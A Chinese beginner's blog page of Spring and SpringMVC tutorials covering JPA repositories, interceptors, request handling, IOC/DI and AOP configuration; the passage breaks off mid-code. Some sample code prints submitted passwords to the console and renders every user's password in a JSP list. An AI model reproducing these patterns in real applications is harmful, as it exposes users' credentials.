</code></pre><p>修改上面的连接信息,然后使用Persistence工具再进行配置<br>参考:<a href="https://my.oschina.net/gaussik/blog/513444" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/513444</a></p>
<p>5.JPA操作<br>JPA是Java Persistence API的简称,就是定义对数据库的操作。首先新建一个repository包,在repository包中的2个接口:UserRepository，BlogRepository并让其都继承JpaRepository。<br>在JpaRepository中定义了几个简化操作数据库的方法        </p>
<pre><code>   findAll()：查找表中所有记录；
findOne(Integer id)：按id来查找某一条记录
findByXXX(Object xxx)：在这里XXX是一个字段名，根据该字段的值开查找所有记录；
save()和delete()：添加一条记录以及删除一条记录
</code></pre><p>除此之外,我们可以在该接口中定义新的方法,如项目中定义的更新用户信息的例子:</p>
<pre><code>@Repository
public interface UserRepository extends     JpaRepository&lt;UserEntity, Integer&gt; {

@Modifying      // 说明该方法是修改操作
@Transactional  // 说明该方法是事务性操作
// 定义查询
// @Param注解用于提取参数
@Query(&quot;update UserEntity us set us.nickname=:qNickname, us.firstName=:qFirstName, us.lastName=:qLastName, us.password=:qPassword where us.id=:qId&quot;)
public void updateUser(@Param(&quot;qNickname&quot;) String nickname, @Param(&quot;qFirstName&quot;) String firstName,
                       @Param(&quot;qLastName&quot;) String qLastName, @Param(&quot;qPassword&quot;) String password, @Param(&quot;qId&quot;) Integer id);
}
</code></pre><p>然后在controller中使用以下语句更新即可</p>
<pre><code>userRepository.updateUser(user.getNickname(), user.getFirstName(),
                user.getLastName(), user.getPassword(), user.getId());
userRepository.flush();   //刷新
</code></pre><p>6.SpringMVC 拦截器<br>IndexInterceptor.java            </p>
<pre><code>package com.interceptor;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;



/*在业务处理器处理请求(controller)之前被调用
false：从当前拦截器往回执行所有拦截器的afterCompletion()
true:依次执行,直到preHandle都完成---&gt;controller--&gt;从最后一个往回执行postHandle()---&gt;从最后一个往回执行afterCompletion()*/


public class IndexInterceptor extends HandlerInterceptorAdapter {

public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response, Object handler) throws Exception {

    System.out.println(&quot;preHandle(), 在访问Controller之前被调用&quot;);
    return true;

}


 //controller之后,view之前        
public void postHandle(HttpServletRequest request,
                       HttpServletResponse response, Object handler,
                       ModelAndView modelAndView) throws Exception {
    System.out.println(&quot;postHandle(), 在访问Controller之后，访问视图之前被调用,这里可以注入一个时间到modelAndView中，用于后续视图显示&quot;);
    modelAndView.addObject(&quot;date&quot;,&quot;由拦截器生成的时间:&quot; + new Date());
}

 //view之后,用于清理资源    
 public void afterCompletion(HttpServletRequest request,
                            HttpServletResponse response, Object handler, Exception ex)
        throws Exception {

    System.out.println(&quot;afterCompletion(), 在访问视图之后被调用&quot;);
}

}
</code></pre><p>多定义几个拦截器即可理解其执行顺序:<br>在浏览器访问localhost:8080/index时,控制台打印:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-18.09.59.30-image.png" alt="2019-01-18.09.59.30-image.png"></p>
<h4 id="Spring-MVC请求流程"><a href="#Spring-MVC请求流程" class="headerlink" title="Spring MVC请求流程"></a>Spring MVC请求流程</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-20.23.10.44-image.png" alt="2019-01-20.23.10.44-image.png"></p>
<p>1.首先,请求离开浏览器后,第一步到达DispatcherServlet,拦截请求并发送给相应的Spring MVC控制器(DispatcherServlet的任务就是拦截请求并发给控制器)<br>2.处理器映射<br>处理器会根据请求携带的url来进行决策请求对应的控制器是哪个,我们配置控制simpleURLHandlerMapping将/hello地址交给helloController处理:</p>
<pre><code>&lt;bean id=&quot;simpleUrlHandlerMapping&quot;
      class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;
    &lt;property name=&quot;mappings&quot;&gt;
        &lt;props&gt;
            &lt;!-- /hello 路径的请求交给 id 为 helloController 的控制器处理--&gt;
            &lt;prop key=&quot;/hello&quot;&gt;helloController&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;
&lt;bean id=&quot;helloController&quot; class=&quot;controller.HelloController&quot;&gt;&lt;/bean&gt;
</code></pre><p>也可以用注释:</p>
<pre><code>@Controller
public class HelloController{

@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)
public String hello{
    //处理逻辑
    //返回视图名
}
</code></pre><p>用了注释就不需要在xml文件中指定controller了,不过需要加上<code>&lt;context:component-scan base-package=&quot;com.controller&quot;/&gt;</code><br>3.控制器处理好相关业务后,将需要返回的数据(Model)和用于渲染输出的视图名(Jsp)返回给DispatcherServlet            </p>
<pre><code>public String getUsers(ModelMap modelMap) {

    //处理逻辑

    //返回模型数据
    modelMap.addAttribute(&quot;userList&quot;, userList);

    //返回用于渲染输出的视图名
    return &quot;admin/users&quot;;
}
</code></pre><p>4.视图解析器            </p>
<pre><code>&lt;bean id=&quot;viewResolver&quot;
      class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/page/&quot; /&gt;
    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;
&lt;/bean&gt;
</code></pre><p>这是一个Spring MVC内置的一个视图解析器,该解析器遵循:在controller中返回的视图名上添加前缀和后缀,进而确定一个web应用中视图资源的物理路径。上面的解析器说明需要返回目录webapp/WEB-INF/page/admin下的users.jsp文件                </p>
<p>5.视图(users.jsp)<br>在视图文件中接收Controller返回的数据(Model)并用于展示    </p>
<pre><code>&lt;c:forEach items=&quot;${userList}&quot; var=&quot;user&quot;&gt;
    ${user.id}
    ${user.nickname}
    ${user.firstName} ${user.lastName}
    ${user.password}
&lt;/c:forEach&gt;
</code></pre><h4 id="控制器接收请求数据"><a href="#控制器接收请求数据" class="headerlink" title="控制器接收请求数据"></a>控制器接收请求数据</h4><p>1.Servlet原生API        </p>
<pre><code>@RequestMapping(value = &quot;/admin/login1&quot;, method = RequestMethod.POST)
public  String loginp1(HttpServletRequest request, HttpServletResponse response){
    String username1 = request.getParameter(&quot;username1&quot;);
    String password1 = request.getParameter(&quot;password1&quot;);
</code></pre><p>2.使用@RequestParam(“前台参数名”)</p>
<pre><code>@RequestMapping(value = &quot;/admin/login3&quot;, method = RequestMethod.POST)
public  String loginp3(@RequestParam(&quot;username&quot;) String username3, @RequestParam(&quot;password&quot;) String password3){

    System.out.println(username3);
    System.out.println(password3);
    return null;
}
</code></pre><p>3.使用同名匹配规则        </p>
<pre><code>@RequestMapping(value = &quot;/admin/login2&quot;, method = RequestMethod.POST)
public  String loginp2(String username2,String password2){

    System.out.println(username2);
    System.out.println(password2);
    return null;
}
</code></pre><p>4.使用模型(model)传参数<br>要求:前台参数名与模型字段名相同。            </p>
<pre><code>User模型
package pojo;

public class User {

    String userName;
    String password;

    /* getter and setter */
}
</code></pre><p>在控制器中使用:            </p>
<pre><code>@RequestMapping(&quot;/login&quot;)
public String get_(User user){
    //user.getUsername();
    //user.getPassword();
}
</code></pre><h4 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h4><p>同servlet一样,只对POST方法有效(因为直接处理的request)<br>通过配置SpringMVC的字符编码过滤器来完成,web.xml中添加</p>
<pre><code>&lt;filter&gt;
    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;encoding&lt;/param-name&gt;
        &lt;!-- 设置编码格式 --&gt;
        &lt;param-value&gt;utf-8&lt;/param-value&gt;
    &lt;/init-param&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre><h4 id="控制器回显数据"><a href="#控制器回显数据" class="headerlink" title="控制器回显数据"></a>控制器回显数据</h4><p>1.使用 Servlet 原生 API 来实现    </p>
<pre><code>@RequestMapping(&quot;/value&quot;)
public ModelAndView hand(HttpServletRequest request,                              
HttpServletResponse response) {
    request.setAttribute(&quot;message&quot;,&quot;成功！&quot;);
    return new ModelAndView(&quot;test1&quot;);
}
</code></pre><p>2.使用 Spring MVC 所提供的 ModelAndView 对象</p>
<pre><code>@RequestMapping(value = &quot;/admin/login&quot;, method = RequestMethod.GET)
  public ModelAndView login(HttpRequest request, HttpResponse response){
      ModelAndView mv = new ModelAndView(&quot;admin/login&quot;);
      mv.addObject(&quot;message&quot;,&quot;测试&quot;);
      return mv;
  }
</code></pre><p>3.使用 Model 对象(常用)            </p>
<pre><code>session.setAttribute(&quot;count&quot;,i);
modelMap.addAttribute(&quot;count&quot;,i);
</code></pre><p>使用@ModelAttribute注解            </p>
<pre><code>@ModelAttribute
public void model(Model model) {
    model.addAttribute(&quot;message&quot;, &quot;注解成功&quot;);
}

@RequestMapping(&quot;/value&quot;)
public String handleRequest() {
    return &quot;test1&quot;;
}
</code></pre><p>这样程序就会在调用该控制器所有的方法前,调用model()方法将message添加到页面参数中去,在视图中可直接调用。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h4><p><a href="https://my.oschina.net/gaussik/blog/385697" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/385697</a><br><a href="http://how2j.cn/k/springmvc/springmvc-springmvc/615.html" target="_blank" rel="noopener">http://how2j.cn/k/springmvc/springmvc-springmvc/615.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/ssm基础之Spring/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/10/ssm基础之Spring/" itemprop="url">ssm基础之Spring</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-10T08:15:41+08:00">
                2019-01-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>早几天就将Java Web的实验收尾了,项目代码(简易论坛)已经上传到Github了,没事儿看看ssm框架,争取早日撸个商城出来。</p>
</blockquote>
<hr>
<p><a href="https://github.com/P0rZ9/Java_Web/tree/master/Java_Web_BBS" target="_blank" rel="noopener">Java_Web_Bbs项目地址</a></p>
<p>SSM <strong>(Spring+SpringMVC+MyBatis)</strong> 框架集由Spring、MyBatis两个开源框架整合而成（SpringMVC是Spring中的部分内容）。常作为数据源较简单的web项目的框架。先了解一波Spring。</p>
<blockquote>
<p>Spring是一个开源框架，主要是为了解决项目开发中的紧耦合的问题，采用了控制反转和AOP技术简化了企业级应用的开发，让开发者能够更专注于业务的开发，减少了流程式的代码，简化了开发过程，所以受到开发人员的欢迎。</p>
</blockquote>
<h2 id="IOC-DI-控制反转-依赖注入"><a href="#IOC-DI-控制反转-依赖注入" class="headerlink" title="IOC/DI 控制反转/依赖注入"></a>IOC/DI 控制反转/依赖注入</h2><blockquote>
<p>在java开发中，如果要使用另外一个类的定义的功能，譬如在A类中需要调用B类的方法，那么一般的做法就是在A类中实例化一个B的对象,通过A.b.method()这样的方式来调用，那么这样造成了什么后果呢？那就是A强烈的依赖于B，这个时候就要求B中方法保持稳定，不能随意变动。这个时候B中的代码就被A给“限制”了，如果这个时候你要修改B中的方法，譬如将method()改为methodA()，那么同时也就要修改A中的代码以适应这个改变，这样的程序改动起来很大，也就是说扩展性很低。<br>控制反转就是为了解决这类问题所提出来的一种概念，主要就是通过一个容器来管理对象之间的依赖关系，Spring就提供了这样的一个容器来管理对象之间的依赖。就以上面的场景来说，A需要用到B中的功能，A只需要向容器提出我需要包含xx功能的对象，容器就能给你一个这样的对象，至于这个对象到底是不是B？你管那么多呢？只要能用就行对吧。<br>Spring中提供的这样的容器就是我们经常提到的ApplicationContext。</p>
</blockquote>
<h2 id="AOP-Aspect-Oriented-Program-面向切面编程"><a href="#AOP-Aspect-Oriented-Program-面向切面编程" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><blockquote>
<p>在开发中，经常会遇到相同的模块，例如打印日志，安全管理这样的功能，可能每一个类都会有这样的需要。譬如我要记录每一个类的调用记录，使用参数等信息，这种功能k可以在每个类中加入相似的代码，直接打印出来就好。但是这种方法将辅助性的功能放到实际业务里去实现了，使每个方法承担的使命太多，如果能狗自动打印日志，不是更好吗？而这种通用的功能就称之为一个切面，面向切面的编程能够简化开发的实际代码，更好的关注于业务本身。</p>
</blockquote>
<h3 id="演示IOC-反转控制-和DI-依赖注入"><a href="#演示IOC-反转控制-和DI-依赖注入" class="headerlink" title="演示IOC(反转控制)和DI(依赖注入)"></a>演示IOC(反转控制)和DI(依赖注入)</h3><h4 id="运行TestSpring演示用Spring获取一个对象-并打印name"><a href="#运行TestSpring演示用Spring获取一个对象-并打印name" class="headerlink" title="运行TestSpring演示用Spring获取一个对象,并打印name"></a>运行TestSpring演示用Spring获取一个对象,并打印name</h4><p>1.<strong>Eclipse新建项目(Java Project),项目名字spring</strong><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.02.18-image.png" alt="2019-01-10.11.02.18-image.png"></p>
<p>2.<strong>下载项目所需的jar包,并导入项目中(Build Path—&gt;Add Externam JARs)</strong><br><a href="http://how2j.cn/frontdownload?bean.id=1484" target="_blank" rel="noopener">Jar包下载</a>,导入后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.03.44-image.png" alt="2019-01-10.11.03.44-image.png"></p>
<p>3.<strong>pojo</strong><br>准备pojo Source类    </p>
<pre><code>package pojo;

public class Source {
     private int id;
    private String name;

    public int getId() {
        return id;
    }
    public void setId(int id) {
        this.id = id;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }  
}
</code></pre><p><strong>4.applicationContext.xml</strong><br>在src目录下新建applicationContext.xml,这是Spring的核心配置文件,通过关键字s获取Source对象,该对象获取的时候,即被注入了字符串”test1”到name属性,数值1到id属性中。    </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans         
xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;
        xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
xsi:schemaLocation=&quot;
   http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
 http://www.springframework.org/schema/aop
 http://www.springframework.org/schema/aop/spring-aop-3.0.xsd
 http://www.springframework.org/schema/tx
 http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
 http://www.springframework.org/schema/context     
 http://www.springframework.org/schema/context/spring-context-3.0.xsd&quot;&gt;

&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
&lt;/bean&gt;
</code></pre><p></p>
<p><strong>5.TestSpring</strong><br>测试代码,演示通过spring获取Source对象,以及该对象被注入的name属性。如图所示,打印通过Spring拿到的Source对象的name与id属性。    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import pojo.Source;

public class TestSpring {
public static void main(String[] args) {
    ApplicationContext context = new ClassPathXmlApplicationContext(
            new String[] { &quot;applicationContext.xml&quot; });

    Source s = (Source) context.getBean(&quot;s&quot;);

    System.out.println(s.getName());
    System.out.println(s.getId());
    }
}
</code></pre><p>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.18.44-image.png" alt="2019-01-10.11.18.44-image.png">    </p>
<p><strong>6.原理图</strong><br>获取对象的方式比较:<br>传统:<code>Source s = new Source();</code><br>IOC:<code>Source s = (Source) context.getBean(&quot;s&quot;);</code><br>对象的声明周期由Spring来管理,直接从Spring那里去获取一个对象,IOC是控制反转(Inversion Of Control)的缩写,控制权交给了Spring。    </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.22.29-image.png" alt="2019-01-10.11.22.29-image.png"></p>
<hr>
<p>上面第一个例子演示了注入对象的属性,下面演示注入Source对象</p>
<h4 id="向Product注入Source对象"><a href="#向Product注入Source对象" class="headerlink" title="向Product注入Source对象"></a>向Product注入Source对象</h4><p>1.Product.java    </p>
<pre><code>package pojo;

public class Product {
    private int id;
    public int getId() {
        return id;
    }
    public void setId(int id) {
        this.id = id;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public Source getSource() {
        return source;
    }
    public void setSource(Source source) {
        this.source = source;
    }
    private String name;
    private Source source;
}
</code></pre><p>2.applicationContext.xml(关键) 在创建Product的时候注入一个Source对象(使用ref来注入另一个对象)        </p>
<pre><code>&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
&lt;/bean&gt;

&lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
    &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
    &lt;property name=&quot;source&quot; ref=&quot;s&quot; /&gt;
&lt;/bean&gt;
</code></pre><p>3.TestSpring.java    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import pojo.Source;
import pojo.Product;

public class TestSpring {

    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(
                new String[] { &quot;applicationContext.xml&quot; });

        //Source s = (Source) context.getBean(&quot;s&quot;);
        Product p = (Product) context.getBean(&quot;p&quot;); 

        System.out.println(p.getName());
        System.out.println(p.getSource().getName());

    }
}
</code></pre><p>通过Spring拿到的Product对象已经被注入了Source对象<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.41.51-image.png" alt="2019-01-10.11.41.51-image.png"></p>
<h4 id="注解方式演示IOC-DI-对注入对象的注解"><a href="#注解方式演示IOC-DI-对注入对象的注解" class="headerlink" title="注解方式演示IOC/DI(对注入对象的注解)"></a>注解方式演示IOC/DI(对注入对象的注解)</h4><p>1.修改applicationContext.xml    </p>
<pre><code>&lt;context:annotation-config/&gt;  
 &lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
     &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
 &lt;/bean&gt;
 &lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
     &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
 &lt;/bean&gt;
</code></pre><p>2.在Product.java中,在定义对象前加<code>@Autowired</code></p>
<pre><code>@Autowired
private Source source;
</code></pre><p>也可以在setSource(Source source)前面添加    </p>
<pre><code>@Autowired
public void setSource(Source source) {
    this.source = source;
}
</code></pre><p>也可以在</p>
<pre><code>@Resource(name=&quot;s&quot;)
private Source source;
</code></pre><h4 id="对Bean本身的注解"><a href="#对Bean本身的注解" class="headerlink" title="对Bean本身的注解"></a>对Bean本身的注解</h4><p>1.修改applicationContext.xml,只新增:</p>
<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
</code></pre><p>作用是告诉Spring,bean都放在pojo这个包下。</p>
<p>2.注解@Component,表示该类为bean    </p>
<pre><code>@Component(&quot;p&quot;)
public class Product {

@Component(&quot;s&quot;)
public class Source {
</code></pre><p>3.因为配置在applicationContext.xml中已经删除,所以属性的初始化要在属性的声明时进行。            </p>
<pre><code>private String name=&quot;product 1&quot;;
private String name=&quot;test1&quot;;
</code></pre><p>Product.java    </p>
<pre><code>package pojo;

import javax.annotation.Resource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

@Component(&quot;p&quot;)
public class Product {
private int id;
private String name = &quot;product 2&quot;;

@Autowired
private Source source;

public int getId() {
    return id;
}
public void setId(int id) {
    this.id = id;
}
public String getName() {
    return name;
}
public void setName(String name) {
    this.name = name;
}
public Source getSource() {
    return source;
}

public void setSource(Source source) {
    this.source = source;
 }

}
</code></pre><h2 id="AOP-Aspect-Oriented-Program-面向切面编程-1"><a href="#AOP-Aspect-Oriented-Program-面向切面编程-1" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><p>1.jar包:<a href="http://how2j.cn/frontdownload?bean.id=1810" target="_blank" rel="noopener">http://how2j.cn/frontdownload?bean.id=1810</a></p>
<p>2.业务类:ProductService.java    </p>
<pre><code>package service
public class ProductService {

public void doSomeService(){

    System.out.println(&quot;doSomeService&quot;);

}
</code></pre><p>}</p>
<p>3.准备日志切面LoggerAspect.java<br>功能:在调用核心功能之前和之后分别打印日志,切面就是原理图中讲的那些辅助功能.将来与某个核心功能编制后,用于实现核心功能的代码:<code>Object object = joinPoint.proceed();</code></p>
<pre><code>package aspect;
import org.aspectj.lang.ProceedingJoinPoint;

public class LoggerAspect {

    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
        Object object = joinPoint.proceed();
        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
        return object;
    }
}
</code></pre><p>4.applicationContext.xml</p>
<pre><code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
&lt;/bean&gt;   
&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;

&lt;aop:config&gt;
    &lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;        
    &lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
    &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;
    &lt;/aop:aspect&gt;
&lt;/aop:config&gt;    
</code></pre><p>大概讲以下这个xml的含义:<br>第一行:<code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
    &lt;/bean&gt;</code> 是声明业务对象的<br>第二行:<code>&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;</code>是声明日志切面的<br>第三行:<code>&lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;</code><br>表示id为该切入点的标识符,expression表示满足该正则的方法调用后,就会进行切面操作,类似于触发了切面。<br><code>expression</code>:第一个<em>表示返回任意类型,包名为<code>service.ProductService</code>开头的类的任意方法(第二个</em>表示任意方法)(..)表示参数的任意类型和个数。<br>简单来说,第三行代码意思就是service包中的ProductService类的任意一个函数被调用,不管返回值为什么,都会触发开关,去执行切面(相当于将业务对象于辅助功能编织在一起),也就是辅助功能:<br><code>&lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
        &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;</code><br>上面说的只要触发开关,就回去执行切面,这里所谓的切面其实就是一个类的方法而已。<br>id代表这个切面的名字,ref表明方法所在类,method代表方法的名字,<code>pointcut-ref=&quot;loggerCutpoint&quot;</code>表示这个切面与上面的切点关联起来的,只要上面的切点被触发,我就会在这里执行一些辅助功能。    <code>&lt;aop:around</code>表示执行的顺序。具体看AOP的基本概念。</p>
<p>5.TestSpring.java    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import service.ProductService;

public class TestSpring {
public static void main(String[] args) {
    ApplicationContext context = new ClassPathXmlApplicationContext(
            new String[] { &quot;applicationContext.xml&quot; });
    ProductService s = (ProductService) context.getBean(&quot;se&quot;);
    s.doSomeService();
}
</code></pre><p>}</p>
<p>执行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.24.40-image.png" alt="2019-01-10.17.24.40-image.png"></p>
<h3 id="AOP的几个重要概念"><a href="#AOP的几个重要概念" class="headerlink" title="AOP的几个重要概念"></a>AOP的几个重要概念</h3><p>1.通知<br>定义了切面何时工作及工作内容,即什么时候去执行切面程序与功能具体的代码。这里一共有5种类型,分别为</p>
<pre><code>a.Before 在方法之前调用通知
b.After 在方法之后调用通知,无论是否执行成功
c.around 在方法之前与之后都调用
d.After-Return    方法执行成功后调用
e.After-throwing    方法抛出异常后调用
</code></pre><p>执行顺序:            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.05.53-image.png" alt="2019-01-10.17.05.53-image.png">            </p>
<p>&lt;aop:aspect id=”logAspect” ref=”loggerAspect”&gt;<br>            &lt;aop:around pointcut-ref=”loggerCutpoint” method=”log”/&gt;<br>        &lt;/aop:aspect&gt;</p>
<p>2.连接点<br>在执行正常功能时,能够插入切面的点,连接点可以是调用方法时、抛出异常时、甚至修改字段时,在这些点,就可以去执行切面            </p>
<p>3.切面<br>定义:切面是切点与通知的集合,通知和切点定义了切面的全部功能—(它是什么,在何时何处完成其功能)<br>声明切面:<code>&lt;aop:aspect&gt;</code>完成的,ref指定类,pointcut-ref,pointcut-ref表明与哪个切点联系,method指定要执行的方法。    </p>
<p>4.切点<br>通知定义了”何时”与”什么”,而切点定义了”何处”<br>作用:定义通知被调用的位置(在哪些连接点)<br>声明切点：<br><strong>a.在\&lt;<a href="aop:config\" target="_blank" rel="noopener">aop:config\</a>&gt;标签下使用\&lt;<a href="aop:pointcut\" target="_blank" rel="noopener">aop:pointcut\</a>&gt;声明一个切入点Bean</strong>该切入点可被多个切面使用,对于需要共享的切入点最好使用该方式。</p>
<pre><code>&lt;aop:config&gt;  
   &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
   &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
      &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
   &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;
</code></pre><p>&lt;aop:pointcut id=”loggerCutpoint” expression=”execution(<em> service.ProductService.</em>(..)) “/&gt;        </p>
<p><strong>b.在<a href="aop:aspect" target="_blank" rel="noopener">aop:aspect</a>标签下使用<a href="aop:pointcut" target="_blank" rel="noopener">aop:pointcut</a>声明一个切入点Bean</strong>该切入点一般只用于该切面。</p>
<pre><code>&lt;aop:config&gt;  
 &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
    &lt;aop:pointcut id=&quot; pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
    &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
 &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;  
</code></pre><p><strong>c.匿名切入点Bean，可以在声明通知时通过pointcut属性指定切入点表达式，该切入点是匿名切入点，只被该通知使用</strong></p>
<pre><code>&lt;aop:config&gt;  
 &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
     &lt;aop:after pointcut=&quot;execution(* cn.javass..*.*(..))&quot; method=&quot;afterFinallyAdvice&quot;/&gt;  
 &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;  
</code></pre><p>5.引入<br>允许我们向现有的类中添加方法或属性。        </p>
<p>6.织入(未理解,先占坑,有时间回来描述)        </p>
<h3 id="注解方式AOP"><a href="#注解方式AOP" class="headerlink" title="注解方式AOP"></a>注解方式AOP</h3><p>1.配置业务类    </p>
<pre><code>@Component(&quot;se&quot;)
public class ProductService {
</code></pre><p>2.注解配置切面</p>
<pre><code>@Aspect 注解表示这是一个切面
@Component 表示这是一个bean,由Spring进行管理
@Around(value = &quot;execution(* com.how2java.service.ProductService.*(..))&quot;) 表示对com.how2java.service.ProductService 这个类中的所有方法进行切面操作
</code></pre><p>LoggerAspect.java</p>
<pre><code>package aspect;

import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.stereotype.Component;


@Aspect
@Component
public class LoggerAspect {

    @Around(value = &quot;execution(* service.ProductService.*(..))&quot;)
    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
        Object object = joinPoint.proceed();
        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
